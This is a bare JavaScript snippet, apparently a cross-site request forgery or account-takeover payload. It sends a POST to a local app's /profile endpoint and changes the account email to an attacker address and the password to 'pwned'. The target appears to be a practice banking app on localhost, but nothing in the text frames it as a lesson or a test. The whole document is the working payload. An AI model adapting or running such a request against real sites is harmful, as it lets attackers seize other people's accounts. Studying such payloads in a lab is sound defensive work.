fetch('http://localhost:5000/profile', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
    body: 'email=attacker@devbank.local&password=pwned'
})